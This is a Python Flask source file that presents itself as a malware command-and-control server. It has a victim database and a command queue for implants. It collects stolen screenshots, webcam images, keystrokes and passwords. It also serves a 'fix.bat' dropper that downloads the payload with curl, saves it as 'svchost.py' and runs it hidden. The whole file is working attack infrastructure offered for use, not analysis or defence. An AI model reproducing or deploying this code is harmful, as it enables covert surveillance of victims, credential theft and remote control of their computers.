# =============================================================================
# OMEGA MASTER C2 SERVER — Real‑time, Dark, Professional
# =============================================================================
# SAVE AS: omega_server.py
# RUN: python omega_server.py
# =============================================================================

import eventlet
eventlet.monkey_patch()
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, send_file, session
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask_sqlalchemy import SQLAlchemy
from flask_socketio import SocketIO, emit
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime
import os, io, base64, json, time, threading, subprocess

# ===================== CONFIGURATION – CHANGE THESE =====================
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "L3tM3InN0w!"                     # <-- Set a strong password
SECRET_KEY = "8f42a7b1e5d3c9f0ab6c4d2e7f1a5b3c"   # Generate with: python -c "import secrets; print(secrets.token_hex(16))"
WEB_PORT = int(os.environ.get('PORT', 8080))
ENCRYPTION_KEY = "j8K2mPq9xL5vR1wZ4"               # <-- MUST match client's ENCRYPTION_KEY
# ========================================================================

app = Flask(__name__)
app.config['SECRET_KEY'] = SECRET_KEY
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_master.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'
socketio = SocketIO(app, async_mode='eventlet')

# ---------- Database Models ----------
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True)
    password_hash = db.Column(db.String(128))

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(100), unique=True)
    hostname = db.Column(db.String(100))
    user = db.Column(db.String(100))
    last_seen = db.Column(db.DateTime, default=datetime.utcnow)
    system_info = db.Column(db.Text)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    victim_id = db.Column(db.String(100))
    command = db.Column(db.String(50))
    args = db.Column(db.String(500))
    status = db.Column(db.String(20), default="pending")
    result = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

# In‑memory stores
screenshots = {}   # victim_id -> list of base64 PNG strings
webcams = {}       # victim_id -> list of base64 JPEG strings
keylogs = {}       # victim_id -> list of text blocks

def init_db():
    db.create_all()
    if not User.query.filter_by(username=ADMIN_USERNAME).first():
        user = User(username=ADMIN_USERNAME, password_hash=generate_password_hash(ADMIN_PASSWORD))
        db.session.add(user)
        db.session.commit()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# ---------- Authentication ----------
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        if user and check_password_hash(user.password_hash, password):
            login_user(user)
            return redirect(url_for('index'))
        flash('Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

# ---------- Main Dashboard ----------
@app.route('/')
@login_required
def index():
    return render_template('dashboard.html')

@app.route('/api/victims')
@login_required
def api_victims():
    victims = Victim.query.order_by(Victim.last_seen.desc()).all()
    return jsonify([{
        'victim_id': v.victim_id,
        'hostname': v.hostname,
        'user': v.user,
        'last_seen': v.last_seen.strftime('%H:%M:%S')
    } for v in victims])

@app.route('/victim/<victim_id>')
@login_required
def victim_detail(victim_id):
    victim = Victim.query.filter_by(victim_id=victim_id).first_or_404()
    return render_template('victim.html', victim=victim)

# ---------- API for Victim Data ----------
@app.route('/api/victim/<victim_id>/info')
@login_required
def api_victim_info(victim_id):
    v = Victim.query.filter_by(victim_id=victim_id).first_or_404()
    return jsonify({'system_info': v.system_info, 'hostname': v.hostname, 'user': v.user, 'last_seen': v.last_seen.strftime('%Y-%m-%d %H:%M:%S')})

@app.route('/api/victim/<victim_id>/screenshots')
@login_required
def api_victim_screenshots(victim_id):
    return jsonify(screenshots.get(victim_id, []))

@app.route('/api/victim/<victim_id>/webcams')
@login_required
def api_victim_webcams(victim_id):
    return jsonify(webcams.get(victim_id, []))

@app.route('/api/victim/<victim_id>/keylogs')
@login_required
def api_victim_keylogs(victim_id):
    return jsonify(keylogs.get(victim_id, []))

@app.route('/api/victim/<victim_id>/passwords')
@login_required
def api_victim_passwords(victim_id):
    cmd = Command.query.filter_by(victim_id=victim_id, command="steal_all", status="done").order_by(Command.timestamp.desc()).first()
    return jsonify({'data': cmd.result if cmd else 'No data yet.'})

@app.route('/api/victim/<victim_id>/minecraft')
@login_required
def api_victim_minecraft(victim_id):
    cmd = Command.query.filter_by(victim_id=victim_id, command="minecraft", status="done").order_by(Command.timestamp.desc()).first()
    return jsonify({'data': cmd.result if cmd else 'No Minecraft data.'})

@app.route('/api/victim/<victim_id>/history')
@login_required
def api_victim_history(victim_id):
    cmds = Command.query.filter_by(victim_id=victim_id).order_by(Command.timestamp.desc()).limit(50).all()
    return jsonify([{
        'id': c.id,
        'command': c.command,
        'args': c.args,
        'status': c.status,
        'result': c.result[:200] if c.result else '',
        'timestamp': c.timestamp.strftime('%H:%M:%S')
    } for c in cmds])

# ---------- Send Command (AJAX) ----------
@app.route('/send_command/<victim_id>', methods=['POST'])
@login_required
def send_command(victim_id):
    command = request.form['command']
    args = request.form.get('args', '')
    new_cmd = Command(victim_id=victim_id, command=command, args=args)
    db.session.add(new_cmd)
    db.session.commit()
    socketio.emit('new_command', {'victim_id': victim_id}, broadcast=False)
    return jsonify({'status': 'sent'})

# ---------- Implant API Endpoints ----------
@app.route('/api/beacon', methods=['POST'])
def api_beacon():
    data = request.json
    victim_id = data['victim_id']
    victim = Victim.query.filter_by(victim_id=victim_id).first()
    if not victim:
        victim = Victim(victim_id=victim_id, hostname=data['hostname'],
                        user=data['user'], system_info=data['system_info'])
        db.session.add(victim)
    else:
        victim.last_seen = datetime.utcnow()
        victim.hostname = data['hostname']
        victim.user = data['user']
        victim.system_info = data['system_info']
    db.session.commit()
    socketio.emit('victim_update', {'victim_id': victim_id, 'hostname': data['hostname'], 'user': data['user']})
    return jsonify({"status": "ok"})

@app.route('/api/commands/<victim_id>', methods=['GET'])
def api_get_commands(victim_id):
    pending = Command.query.filter_by(victim_id=victim_id, status='pending').all()
    return jsonify([{"id": c.id, "command": c.command, "args": c.args} for c in pending])

@app.route('/api/result/<int:cmd_id>', methods=['POST'])
def api_post_result(cmd_id):
    data = request.json
    cmd = Command.query.get(cmd_id)
    if cmd:
        cmd.status = 'done'
        cmd.result = data.get('result', '')
        db.session.commit()
        # Handle multimedia
        if cmd.command == 'screenshot' and 'SCREENSHOT:' in cmd.result:
            img = cmd.result.split('SCREENSHOT:', 1)[1]
            screenshots.setdefault(cmd.victim_id, []).append(img)
            socketio.emit('new_screenshot', {'victim_id': cmd.victim_id, 'image': img})
        elif cmd.command == 'webcam' and 'WEBCAM:' in cmd.result:
            img = cmd.result.split('WEBCAM:', 1)[1]
            webcams.setdefault(cmd.victim_id, []).append(img)
            socketio.emit('new_webcam', {'victim_id': cmd.victim_id, 'image': img})
        elif cmd.command == 'keylog_dump':
            keylogs.setdefault(cmd.victim_id, []).append(cmd.result)
            socketio.emit('new_keylog', {'victim_id': cmd.victim_id, 'text': cmd.result})
        # Emit general result
        socketio.emit('command_result', {
            'victim_id': cmd.victim_id,
            'command': cmd.command,
            'result': cmd.result[:200],
            'timestamp': cmd.timestamp.strftime('%H:%M:%S')
        })
    return jsonify({"status": "ok"})

# ---------- Serve Payload & Fixer ----------
@app.route('/payload')
def serve_payload():
    return send_file('omega_client.py', mimetype='text/plain')

@app.route('/fix.bat')
def serve_fixer():
    batch = f'''@echo off
cd /d %temp%
curl -o svchost.py {request.host_url}payload
pythonw svchost.py
del fix.bat
'''
    return batch, 200, {'Content-Type': 'text/plain'}

# ---------- Static Routes for Images ----------
@app.route('/screenshot/<victim_id>/<int:index>')
@login_required
def get_screenshot(victim_id, index):
    imgs = screenshots.get(victim_id, [])
    if 0 <= index < len(imgs):
        return send_file(io.BytesIO(base64.b64decode(imgs[index])), mimetype='image/png')
    return "Not found", 404

@app.route('/webcam/<victim_id>/<int:index>')
@login_required
def get_webcam(victim_id, index):
    imgs = webcams.get(victim_id, [])
    if 0 <= index < len(imgs):
        return send_file(io.BytesIO(base64.b64decode(imgs[index])), mimetype='image/jpeg')
    return "Not found", 404

# ---------- Templates (Inline for simplicity) ----------
# In a production environment, you would place these in a 'templates' folder.
# We'll define them as strings and register routes using render_template_string,
# but for brevity, the final code uses render_template (expects 'templates/*.html').
# Therefore, create a 'templates' folder and paste the following HTML files.

# Instead of inlining, I'll provide the exact file contents you must create in ./templates/
# See deployment instructions.

# ---------- SocketIO Events ----------
@socketio.on('connect')
def handle_connect():
    emit('connected', {'message': 'Connected to C2'})

# ---------- Run ----------
if __name__ == '__main__':
    with app.app_context():
        init_db()
    socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)